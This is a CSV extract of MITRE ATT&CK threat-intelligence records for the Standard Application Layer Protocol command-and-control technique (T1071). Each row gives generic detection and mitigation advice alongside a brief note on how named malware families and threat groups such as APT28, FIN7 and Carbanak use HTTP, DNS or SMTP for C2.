'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: httpclient,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1353,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0065|4H RAT]] uses HTTP for command and control.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: 4H RAT,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1354,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['The [[Software/S0030|Carbanak]] malware communicates to its command server using HTTP with an encrypted payload.[[CiteRef::Kaspersky Carbanak]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Carbanak, Anunak",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1355,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0074|Sakula]] uses HTTP for C2.[[CiteRef::Dell Sakula]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Sakula, Sakurel, VIPER",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1356,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0145|POWERSOURCE]] uses DNS TXT records for C2.[[CiteRef::FireEye FIN7 March 2017]][[CiteRef::Cisco DNSMessenger March 2017]]'],['FIN7'],['FIN7'],['G0046'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: POWERSOURCE, DNSMessenger",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1357,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0146|TEXTMATE]] uses DNS TXT records for C2.[[CiteRef::FireEye FIN7 March 2017]]'],['FIN7'],['FIN7'],['G0046'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: TEXTMATE, DNSMessenger",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1358,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['The [[Software/S0030|Carbanak]] malware communicates to its command server using HTTP with an encrypted payload.[[CiteRef::Kaspersky Carbanak]]'],['FIN7'],['FIN7'],['G0046'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Carbanak, Anunak",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1359,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0147|Pteranodon]] can use HTTP for C2.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Pteranodon,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1360,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['A [[Group/G0047|Gamaredon Group]] file stealer can communicate over HTTP for C2.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1361,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Software/S0070|HTTPBrowser]] has used HTTP, HTTPS, and DNS for command and control.[[CiteRef::ThreatStream Evasion Analysis]][[CiteRef::Dell TG-3390]]']",['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HTTPBrowser, Token Control, HttpDump",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1362,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0124|Pisloader]] uses DNS as its C2 protocol.[[CiteRef::Palo Alto DNS Requests]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Pisloader,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1363,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Software/S0125|Remsec]] is capable of using HTTP, HTTPS, SMTP, and DNS for C2.[[CiteRef::Symantec Remsec IOCs]][[CiteRef::Kaspersky ProjectSauron Full Report]][[CiteRef::Kaspersky ProjectSauron Technical Analysis]]']",['Strider'],"['Strider', 'ProjectSauron']",['G0041'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1364,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Group/G0005|APT12]] has used [[Software/S0003|RIPTIDE]], a RAT that uses HTTP to communicate.[[CiteRef::Moran 2014]]']",['APT12'],"['APT12', 'IXESHE', 'DynCalc', 'Numbered Panda']",['G0005'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: RIPTIDE,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1365,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['Various implementations of [[Software/S0023|CHOPSTICK]] communicate with C2 over HTTP, SMTP, and POP3.[[CiteRef::ESET Sednit Part 2]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CHOPSTICK, SPLM, ...",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1366,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0044|JHUHUGIT]] communicates with its C2 server over HTTP.[[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: JHUHUGIT, Seduploader, ...",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1367,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0045|ADVSTORESHELL]] connects to port 80 of a C2 server using Wininet API.[[CiteRef::Kaspersky Sofacy]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ADVSTORESHELL, NETUI, ...",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1368,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Software/S0137|CORESHELL]] can communicate over HTTP, SMTP, and POP3 for C2.[[CiteRef::FireEye APT28]][[CiteRef::Microsoft SIR Vol 19]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CORESHELL, SOURFACE",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1369,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0138|OLDBAIT]] can use HTTP or SMTP for C2.[[CiteRef::FireEye APT28]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: OLDBAIT, Sasfis",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1370,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0161|XAgentOSX]] contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.[[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: XAgentOSX,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1371,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['The Komplex C2 channel uses HTTP POST requests [[CiteRef::Sofacy Komplex Trojan]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Komplex,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1372,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Group/G0007|APT28]] used SMTP as a communication channel in various implants, initially using self-registered Google Mail accounts and later compromised email servers of its victims. Later implants such as [[Software/S0023|CHOPSTICK]] use a blend of HTTP and other legitimate channels, depending on module configuration.[[CiteRef::FireEye APT28]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1373,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['Some variants of [[Software/S0076|FakeM]] use SSL to communicate with C2 servers.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: FakeM,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1374,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0078|Psylo]] uses HTTPS for C2.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Psylo,['Command and Control'],['Technique/T1071'],['Standard Application Layer 